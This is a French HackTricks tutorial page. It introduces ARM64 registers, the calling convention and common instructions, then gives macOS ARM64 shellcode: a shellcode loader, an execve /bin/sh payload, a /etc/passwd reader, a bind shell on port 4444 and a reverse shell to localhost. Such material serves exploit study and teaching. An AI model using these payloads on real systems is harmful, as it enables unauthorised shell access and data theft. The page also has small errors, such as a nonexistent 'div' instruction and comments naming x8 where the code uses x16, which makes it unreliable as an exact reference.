# Introduction à ARM64

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Introduction à ARM64**

ARM64, également connu sous le nom d'ARMv8-A, est une architecture de processeur 64 bits utilisée dans différents types d'appareils, y compris les smartphones, les tablettes, les serveurs et même certains ordinateurs personnels haut de gamme (macOS). C'est un produit d'ARM Holdings, une entreprise connue pour ses conceptions de processeurs économes en énergie.

### **Registres**

ARM64 dispose de **31 registres généraux**, étiquetés `x0` à `x30`. Chacun peut stocker une valeur de **64 bits** (8 octets). Pour les opérations qui nécessitent uniquement des valeurs de 32 bits, les mêmes registres peuvent être accessibles en mode 32 bits en utilisant les noms w0 à w30.

1. **`x0`** à **`x7`** - Ils sont généralement utilisés comme registres temporaires et pour transmettre des paramètres aux sous-routines.
* **`x0`** transporte également les données de retour d'une fonction.
2. **`x8`** - Dans le noyau Linux, `x8` est utilisé comme numéro d'appel système pour l'instruction `svc`. **Dans macOS, c'est x16 qui est utilisé !**
3. **`x9`** à **`x15`** - Registres temporaires supplémentaires, souvent utilisés pour les variables locales.
4. **`x16`** et **`x17`** - Registres temporaires, également utilisés pour les appels de fonction indirects et les stubs PLT (Procedure Linkage Table).
* **`x16`** est utilisé comme numéro d'appel système pour l'instruction **`svc`**.
5. **`x18`** - Registre de plateforme. Sur certaines plateformes, ce registre est réservé à des utilisations spécifiques à la plateforme.
6. **`x19`** à **`x28`** - Ce sont des registres sauvegardés par l'appelé. Une fonction doit préserver les valeurs de ces registres pour son appelant.
7. **`x29`** - Pointeur de cadre.
8. **`x30`** - Registre de lien. Il contient l'adresse de retour lorsqu'une instruction `BL` (Branch with Link) ou `BLR` (Branch with Link to Register) est exécutée.
9. **`sp`** - Pointeur de pile, utilisé pour suivre le sommet de la pile.
10. **`pc`** - Compteur de programme, qui pointe vers l'instruction suivante à exécuter.

### **Convention d'appel**

La convention d'appel ARM64 spécifie que les **huit premiers paramètres** d'une fonction sont passés dans les registres **`x0` à `x7`**. Les **paramètres supplémentaires** sont passés sur la **pile**. La **valeur de retour** est renvoyée dans le registre **`x0`**, ou dans **`x1`** également **s'il fait 128 bits**. Les registres **`x19`** à **`x30`** et **`sp`** doivent être **préservés** lors des appels de fonction.

Lors de la lecture d'une fonction en langage d'assemblage, recherchez le **prologue et l'épilogue de la fonction**. Le **prologue** implique généralement **la sauvegarde du pointeur de cadre (`x29`)**, **la configuration** d'un **nouveau pointeur de cadre** et **l'allocation d'espace de pile**. L'**épilogue** implique généralement **la restauration du pointeur de cadre sauvegardé** et **le retour** de la fonction.

### Convention d'appel en Swift

Swift a sa propre **convention d'appel** que l'on peut trouver dans [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

### **Instructions courantes**

Les instructions ARM64 ont généralement le **format `opcode dst, src1, src2`**, où **`opcode`** est l'**opération** à effectuer (comme `add`, `sub`, `mov`, etc.), **`dst`** est le registre **destination** où le résultat sera stocké, et **`src1`** et **`src2`** sont les registres **source**. Des valeurs immédiates peuvent également être utilisées à la place des registres source.

* **`mov`** : **Déplacer** une valeur d'un **registre** vers un autre.
* Exemple : `mov x0, x1` — Cela déplace la valeur de `x1` vers `x0`.
* **`ldr`** : **Charger** une valeur depuis la **mémoire** dans un **registre**.
* Exemple : `ldr x0, [x1]` — Cela charge une valeur depuis l'emplacement mémoire pointé par `x1` dans `x0`.
* **`str`** : **Stocker** une valeur depuis un **registre** dans la **mémoire**.
* Exemple : `str x0, [x1]` — Cela stocke la valeur de `x0` dans l'emplacement mémoire pointé par `x1`.
* **`ldp`** : **Charger une paire de registres**. Cette instruction **charge deux registres** à partir de **emplacements mémoire consécutifs**. L'adresse mémoire est généralement formée en ajoutant un décalage à la valeur d'un autre registre.
* Exemple : `ldp x0, x1, [x2]` — Cela charge `x0` et `x1` depuis les emplacements mémoire à `x2` et `x2 + 8`, respectivement.
* **`stp`** : **Stocker une paire de registres**. Cette instruction **stocke deux registres** dans des **emplacements mémoire consécutifs**. L'adresse mémoire est généralement formée en ajoutant un décalage à la valeur d'un autre registre.
* Exemple : `stp x0, x1, [x2]` — Cela stocke `x0` et `x1` dans les emplacements mémoire à `x2` et `x2 + 8`, respectivement.
* **`add`** : **Ajouter** les valeurs de deux registres et stocker le résultat dans un registre.
* Exemple : `add x0, x1, x2` — Cela ajoute les valeurs dans `x1` et `x2` ensemble et stocke le résultat dans `x0`.
* **`sub`** : **Soustraire** les valeurs de deux registres et stocker le résultat dans un registre.
* Exemple : `sub x0, x1, x2` — Cela soustrait la valeur dans `x2` de `x1` et stocke le résultat dans `x0`.
* **`mul`** : **Multiplier** les valeurs de **deux registres** et stocker le résultat dans un registre.
* Exemple : `mul x0, x1, x2` — Cela multiplie les valeurs dans `x1` et `x2` et stocke le résultat dans `x0`.
* **`div`** : **Diviser** la valeur d'un registre par un autre et stocker le résultat dans un registre.
* Exemple : `div x0, x1, x2` — Cela divise la valeur dans `x1` par `x2` et stocke le résultat dans `x0`.
* **`bl`** : **Brancher** avec lien, utilisé pour **appeler** une **sous-routine**. Stocke l'**adresse de retour dans `x30`**.
* Exemple : `bl myFunction` — Cela appelle la fonction `myFunction` et stocke l'adresse de retour dans `x30`.
* **`blr`** : **Brancher** avec lien vers un registre, utilisé pour **appeler** une **sous-routine** où la cible est **spécifiée** dans un **registre**. Stocke l'adresse de retour dans `x30`.
* Exemple : `blr x1` — Cela appelle la fonction dont l'adresse est contenue dans `x1` et stocke l'adresse de retour dans `x30`.
* **`ret`** : **Retourner** de la **sous-routine**, généralement en utilisant l'adresse dans **`x30`**.
* Exemple : `ret` — Cela retourne de la sous-routine en utilisant l'adresse de retour dans `x30`.
* **`cmp`** : **Comparer** deux registres et définir les indicateurs de condition.
* Exemple : `cmp x0, x1` — Cela compare les valeurs dans `x0` et `x1` et définit les indicateurs de condition en conséquence.
* **`b.eq`** : **Brancher si égal**, basé sur l'instruction `cmp` précédente.
* Exemple : `b.eq label` — Si l'instruction `cmp` précédente a trouvé deux valeurs égales, cela saute à `label`.
* **`b.ne`** : **Brancher si différent**. Cette instruction vérifie les indicateurs de condition (qui ont été définis par une instruction de comparaison précédente), et si les valeurs comparées ne sont pas égales, elle saute à une étiquette ou une adresse.
* Exemple : Après une instruction `cmp x0, x1`, `b.ne label` — Si les valeurs dans `x0` et `x1` ne sont pas égales, cela saute à `label`.
* **`cbz`** : **Comparer et brancher si zéro**. Cette instruction compare un registre avec zéro, et s'ils sont égaux, elle saute à une étiquette ou une adresse.
* Exemple : `cbz x0, label` — Si la valeur dans `x0` est zéro, cela saute à `label`.
* **`cbnz`** : **Comparer et brancher si non zéro**. Cette instruction compare un registre avec zéro, et s'ils ne sont pas égaux, elle saute à une étiquette ou une adresse.
* Exemple : `cbnz x0, label` — Si la valeur dans `x0` n'est pas zéro, cela saute à `label`.
* **`adrp`** : Calculer l'**adresse de page d'un symbole** et la stocker dans un registre.
* Exemple : `adrp x0, symbol` — Cela calcule l'adresse de page de `symbol` et la stocke dans `x0`.
* **`ldrsw`** : **Charger** une valeur signée de **32 bits** depuis la mémoire et **l'étendre à 64 bits**.
* Exemple : `ldrsw x0, [x1]` — Cela charge une valeur signée de 32 bits depuis l'emplacement mémoire pointé par `x1`, l'étend à 64 bits et la stocke dans `x0`.
* **`stur`** : **Stocker une valeur de registre dans un emplacement mémoire**, en utilisant un décalage par rapport à un autre registre.
* Exemple : `stur x0, [x1, #4]` — Cela stocke la valeur dans `x0` dans l'adresse mémoire qui est 4 octets supérieure à l'adresse actuellement dans `x1`.
* &#x20;**`svc`** : Effectuer un **appel système**. Il signifie "Supervisor Call". Lorsque le processeur exécute cette instruction, il **passe du mode utilisateur au mode noyau** et saute à un emplacement spécifique en mémoire où se trouve le code de gestion des appels système du noyau.
*   Exemple :&#x20;

```armasm
mov x8, 93  ; Charger le numéro d'appel système pour exit (93) dans le registre x8.
mov x0, 0   ; Charger le code de statut de sortie (0) dans le registre x0.
svc 0       ; Effectuer l'appel système.
```

### **Prologue de fonction**

1.  **Sauvegarder le registre de lien et le pointeur de cadre dans la pile** :

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; stocker la paire x29 et x30 dans la pile et décrémenter le pointeur de pile
```
{% endcode %}
2. **Configurer le nouveau pointeur de cadre** : `mov x29, sp` (configure le nouveau pointeur de cadre pour la fonction en cours)
3. **Allouer de l'espace dans la pile pour les variables locales** (si nécessaire) : `sub sp, sp, <taille>` (où `<taille>` est le nombre d'octets nécessaires)

### **Épilogue de fonction**

1. **Désallouer les variables locales (si des variables ont été allouées)** : `add sp, sp, <taille>`
2.  **Restaurer le registre de lien et le pointeur de cadre** :

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; charger la paire x29 et x30 depuis la pile et incrémenter le pointeur de pile
```
{% endcode %}
3. **Retourner** : `ret` (retourne le contrôle à l'appelant en utilisant l'adresse dans le registre de lien)

## macOS

### Appels système BSD

Consultez [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). Les appels système BSD auront **x16 > 0**.

### Trappes Mach

Consultez [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html). Les trappes Mach auront **x16 < 0**, donc vous devez appeler les numéros de la liste précédente avec un **moins** : **`_kernelrpc_mach_vm_allocate_trap`** est **`-10`**.

Vous pouvez également consulter **`libsystem_kernel.dylib`** dans un désassembleur pour savoir comment appeler ces appels système (et BSD) :
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
Parfois, il est plus facile de vérifier le code **décompilé** de **`libsystem_kernel.dylib`** que de vérifier le **code source** car le code de plusieurs appels système (BSD et Mach) est généré via des scripts (vérifiez les commentaires dans le code source) tandis que dans la dylib, vous pouvez trouver ce qui est appelé.
{% endhint %}

### Shellcodes

Pour compiler :
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Pour extraire les octets :
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>Code C pour tester le shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Extrait de [**ici**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) et expliqué.

{% tabs %}
{% tab title="avec adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% tab title="avec la pile" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### Lire avec cat

L'objectif est d'exécuter `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, donc le deuxième argument (x1) est un tableau de paramètres (ce qui signifie en mémoire une pile d'adresses).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Exécuter une commande avec sh à partir d'une bifurcation pour que le processus principal ne soit pas tué
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Shell en écoute

Shell en écoute sur le **port 4444** à partir de [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s)
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Depuis [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell vers **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
